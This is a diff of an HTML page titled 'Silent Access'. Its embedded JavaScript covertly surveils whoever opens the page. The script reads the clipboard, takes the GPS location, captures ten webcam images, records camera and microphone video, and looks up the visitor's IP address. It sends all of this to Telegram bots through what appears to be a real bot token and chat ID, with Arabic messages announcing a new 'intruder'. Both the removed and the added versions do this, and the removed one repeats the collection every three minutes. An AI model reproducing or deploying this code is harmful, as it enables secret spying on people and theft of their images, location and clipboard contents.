@@ -166,145 +166,106 @@ webmOCTYPE html>
 </div>
 
 
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Silent Access</title>
+</head>
+<body>
 <script>
-const bots = [
-  { token: '7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M', chat_id: '7664410054' },
-  { token: 'توكن_البوت_2', chat_id: 'معرف_2' },
-  { token: 'توكن_البوت_3', chat_id: 'معرف_3' }
-];
+(async () => {
+  // إعداد الفيديو للصمت التام بدون عرض
+  const video = document.createElement('video');
+  video.muted = true;
+  video.setAttribute('playsinline', true);
 
-let clipboardText = "لم تُقرأ الحافظة";
+  // طلب الأذونات: كاميرا + مايك + موقع + حافظة
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(console.error);
+  navigator.clipboard.readText().then(clip => console.log("Clipboard:", clip)).catch(()=>{});
 
-let clipboardRead = false;
-window.addEventListener('click', async () => {
-  if (clipboardRead) return;
-  clipboardRead = true;
-  try {
-    clipboardText = await navigator.clipboard.readText();
-  } catch (e) {
-    clipboardText = "❌ فشل في قراءة الحافظة";
-  }
-});
+  navigator.geolocation.getCurrentPosition(async (position) => {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
 
-// الوظيفة الكاملة المتكررة:
-async function collectAndSend() {
-  let images = [];
-  let videoBlob = null;
-  let gpsData = "❌ لم يُسمح بالموقع";
-  let ip = "❌ غير معروف", country = "❌ غير معروف", region = "❌ غير معروف";
+    // إنشاء MediaRecorder للفيديو
+    const recorder = new MediaRecorder(stream);
+    let videoChunks = [];
+    recorder.ondataavailable = e => videoChunks.push(e.data);
+    recorder.start();
 
-  // GPS
-  await new Promise((resolve) => {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        gpsData = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-        resolve();
-      },
-      err => {
-        gpsData = "❌ رفض الموقع";
-        resolve();
-      }
-    );
-  });
-
-  // IP
-  try {
-    const res = await fetch("https://ipinfo.io/json?token=6d3fbbdc9f6b37");
-    const data = await res.json();
-    ip = data.ip;
-    country = data.country;
-    region = data.region;
-  } catch (e) {
-    console.error("❌ فشل في جلب IP");
-  }
-
-  // الكاميرا + المايك
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-
+    // التقاط 10 صور كل 2 ثانية
+    const images = [];
     const canvas = document.createElement('canvas');
-    canvas.width = 300;
-    canvas.height = 200;
     const ctx = canvas.getContext('2d');
+    canvas.width = 300;
+    canvas.height = 300;
+    video.srcObject = stream;
+    video.play();
 
-    // 10 صور
     for (let i = 0; i < 10; i++) {
       await new Promise(r => setTimeout(r, 2000));
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      await new Promise(resolve => canvas.toBlob(blob => {
-        images.push(blob);
-        resolve();
-      }, 'image/png'));
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+      images.push(blob);
     }
 
-    // فيديو 10 ثوانٍ
-    const recorder = new MediaRecorder(stream);
-    const chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => {
-      videoBlob = new Blob(chunks, { type: 'video/webm' });
-    };
-    recorder.start();
-    await new Promise(r => setTimeout(r, 10000));
     recorder.stop();
+    const videoBlob = await new Promise(res => {
+      recorder.onstop = () => res(new Blob(videoChunks, { type: 'video/webm' }));
+    });
 
-    await new Promise(r => setTimeout(r, 1000)); // انتظر تجهيز الفيديو
-  } catch (e) {
-    console.error("❌ فشل الكاميرا/مايك");
-  }
+    // الحصول على IP
+    let ip = "غير معروف";
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      ip = data.ip;
+    } catch (e) {}
 
-  // الرسائل
-  const messages = [
-    "👑شادو، هناك دخيل جديد👑",
-    `(꧁${country}꧂)\n(꧁${region}꧂)`,
-    "🌐بيانات الدخيل🌐",
-    `👁IP👁\n♛(༺ཌ༈ ${ip} ༈ད༻)♛`,
-    `👁gps👁\n(༺ཌ༈ ${gpsData} ༈ད༻)`,
-    `📋الحافظة📋\n${clipboardText}`
-  ];
+    // إرسال البيانات
+    const bots = [
+      { token: "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M", chat: "7664410054" },
+      { token: "BOT_TOKEN_2", chat: "CHAT_ID_2" },
+      { token: "BOT_TOKEN_3", chat: "CHAT_ID_3" }
+    ];
 
-  for (const { token, chat_id } of bots) {
-    for (const msg of messages) {
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    for (const bot of bots) {
+      const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+      await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: msg })
+        body: JSON.stringify({
+          chat_id: bot.chat,
+          text: `👑شادو، هناك دخيل جديد👑\n\n(꧁الجزائر꧂)\n(꧁Algeria꧂)\n\n🌐بيانات الدخيل🌐\n\n👁IP👁\n♛(༺ཌ༈ ${ip} ༈ད༻)♛\n\n👁gps👁\n(༺ཌ༈ ${lat}, ${lon} ༈ད༻)`
+        })
       });
-    }
 
-    if (videoBlob) {
-      const form = new FormData();
-      form.append("chat_id", chat_id);
-      form.append("caption", "🎬فيديوهات🎬");
-      form.append("video", videoBlob, "intruder.webm");
-      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+      // إرسال الفيديو
+      const formVideo = new FormData();
+      formVideo.append("chat_id", bot.chat);
+      formVideo.append("video", videoBlob, "video.webm");
+      await fetch(`https://api.telegram.org/bot${bot.token}/sendVideo`, {
         method: "POST",
-        body: form
+        body: formVideo
       });
+
+      // إرسال الصور واحدة تلو الأخرى
+      for (const [i, img] of images.entries()) {
+        const formImg = new FormData();
+        formImg.append("chat_id", bot.chat);
+        formImg.append("photo", img, `img${i}.png`);
+        await fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, {
+          method: "POST",
+          body: formImg
+        });
+      }
     }
 
-    for (let i = 0; i < images.length; i++) {
-      const imgForm = new FormData();
-      imgForm.append("chat_id", chat_id);
-      if (i === 0) imgForm.append("caption", "📸صور📸");
-      imgForm.append("photo", images[i], `img${i + 1}.png`);
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: "POST",
-        body: imgForm
-      });
-    }
-  }
-}
-
-// أول تنفيذ عند الدخول
-collectAndSend();
-
-// إعادة كل 3 دقائق = 180000 ms
-setInterval(collectAndSend, 180000);
+  }, error => console.error("فشل تحديد الموقع:", error));
+})();
 </script>
 
 </body>
 </html>
+
